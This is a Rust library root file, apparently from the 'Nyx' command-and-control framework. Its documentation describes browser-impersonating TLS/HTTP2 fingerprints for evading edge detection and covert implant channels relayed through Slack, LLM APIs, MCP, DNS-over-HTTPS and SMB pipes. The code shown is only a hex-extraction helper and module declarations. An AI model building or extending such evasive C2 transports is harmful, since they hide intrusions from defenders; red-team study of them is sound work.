//! Nyx transport fingerprint engine.
//!
//! The #1 way modern C2 traffic is caught at the edge is fingerprinting the
//! transport, not the HTTP layer: TLS [JA3]/[JA4] over the ClientHello, and the
//! [Akamai passive HTTP/2 fingerprint] over the frame sequence.
//!
//! - **Computation/verification** (`tls`, `h2`): parse a TLS ClientHello and an
//!   HTTP/2 connection preface into structured fields and compute the same
//!   fingerprint strings defenders (Cloudflare, Akamai, Fastly) key on. The team
//!   server uses these to profile/allowlist connecting clients.
//! - **Emission** (`fingerprint`): the inverse — the API surface and mapping
//!   logic for building an HTTP client whose ClientHello and HTTP/2 frames
//!   impersonate a real browser (Chrome/Firefox/Safari/Edge). The backend
//!   (BoringSSL `rquest`) is not yet wired — see `fingerprint` module docs.
//!
//! [JA3]: https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967/
//! [JA4]: https://github.com/FoxIO-LLC/ja4/blob/main/technical_details/JA4.md
//! [Akamai passive HTTP/2 fingerprint]: https://blackhat.com/docs/eu-17/materials/eu-17-Shuster-Passive-Fingerprinting-Of-HTTP2-Clients-wp.pdf
//!
//! # Status: partial integration (2026-07-18)
//!
//! The `Transport` trait (in `traits.rs`) and its 6 impls — `malleable`,
//! `doh_dns`, `slack_api`, `llm_api`, `mcp`, `smb_pipe` — are now consumed by
//! the [`TransportStack`] adapter (`stack.rs`), a CS-style ordered fallback
//! chain that drives `send`/`recv`/`health_check`/`init`/`max_frame_size`
//! across a `Vec<Box<dyn Transport>>`.
//!
//! The server (`crates/server`) uses the stack to back its `/extc2/slack` and
//! `/extc2/mcp` routes, which now actually relay to the real third-party API
//! via `SlackTransport` / `McpTransport` (see `server/src/extc2_relay.rs`).
//! The other 4 channels (`malleable`, `doh_dns`, `llm_api`, `smb_pipe`) are
//! still stack-ready but not yet wired to a server route — see the per-channel
//! design notes in `extc2_relay.rs`.
//!
//! `implant-win` remains on its own hand-rolled WinHTTP/kernel32 channel
//! system (`channels/`) by design: it is `#![no_std]` PIC and cannot link the
//! `std`-using transport crate. The transport crate's role is the *server-side*
//! relay; the implant-side channels live in `implant-win/src/channels/`.
//!
//! Only the JA3/JA4 fingerprinting path (`tls`, `h2`) is wired into the server
//! listener itself (see `server/src/main.rs`).
#![allow(dead_code)]
// doc_lazy_continuation fires on paragraph→bullet-list transitions in the
// fingerprint module's feature-gating doc; the bullets are independent items.
#![allow(clippy::doc_lazy_continuation)]


// ---- Shared helpers ---------------------------------------------------------

/// Extract the longest contiguous hex-digit run from `text`.
///
/// Finds the longest run of consecutive ASCII hex digits (0-9, a-f, A-F).
/// Only runs of ≥ 8 characters are considered. Non-hex characters act as
/// delimiters. Used by LLM API and MCP transports to extract hex-encoded
/// sealed frames from third-party API responses.
pub(crate) fn extract_hex(text: &str) -> Option<String> {
    let mut longest: Option<&str> = None;
    let mut run_start: Option<usize> = None;

    for (i, c) in text.char_indices() {
        if c.is_ascii_hexdigit() {
            if run_start.is_none() {
                run_start = Some(i);
            }
        } else if let Some(s) = run_start.take() {
            let run = &text[s..i];
            if run.len() >= 8 && longest.is_none_or(|l| run.len() > l.len()) {
                longest = Some(run);
            }
        }
    }
    // Flush any run that extends to the end of the text.
    if let Some(s) = run_start {
        let run = &text[s..];
        if run.len() >= 8 && longest.is_none_or(|l| run.len() > l.len()) {
            longest = Some(run);
        }
    }

    longest.map(|s| s.to_string())
}

pub mod doh_dns;
pub mod fingerprint;
pub mod h2;
pub mod llm_api;
pub mod malleable;
pub mod mcp;
pub mod slack_api;
pub mod smb_pipe;
pub mod stack;
pub mod tls;
pub mod traits;

pub use h2::{akamai_h2, H2Fingerprint};
pub use stack::{StackError, TransportStack, TransportStackBuilder};
pub use tls::{ja3, ja4, parse_client_hello, sniff_client_hello, ClientHello};
